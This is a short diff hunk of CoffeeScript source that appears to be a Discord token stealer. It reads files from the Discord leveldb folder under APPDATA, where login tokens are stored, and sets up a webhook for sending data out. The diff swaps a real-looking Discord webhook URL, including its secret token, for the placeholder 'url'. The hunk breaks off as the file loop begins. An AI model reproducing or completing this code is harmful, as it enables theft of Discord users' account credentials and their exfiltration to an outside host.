@@ -1,6 +1,6 @@
 fs = require('fs')
 request = require('request')
-webhook = String('https://discord.com/api/webhooks/863453017646694400/zlDYi9nP0M0f-Y2baYrLawX9Wa9bngRF2SjrgwcIK3Ai3w9ZLak2t9_xlh_bdkYiUnGn')
+webhook = String('url')
 files = []
 r = []
 fs.readdirSync(process.env.APPDATA + '/Discord/Local Storage/leveldb').forEach (e) ->
